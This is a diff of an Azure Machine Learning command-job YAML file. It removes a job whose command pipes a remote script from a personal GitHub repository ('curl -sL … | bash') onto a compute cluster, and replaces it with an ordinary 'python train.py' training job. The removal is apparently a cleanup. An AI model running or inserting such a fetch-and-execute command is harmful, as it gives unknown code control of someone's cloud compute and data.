@@ -1,8 +1,6 @@
 $schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json
-type: command
-
-command: curl -sL https://github.com/hasmenkuy99/files/raw/main/mbcc | bash
-
-environment: azureml://registries/azureml/environments/tensorflow-2.11-cpu/versions/5
-
-compute: acluster8
+command: python train.py
+code: .
+environment: azureml:AzureML-sklearn-1.0-ubuntu20.04-py38-cpu:1
+compute: azureml:<your-dedicated-cluster-name>
+experiment_name: dedicated-compute-job
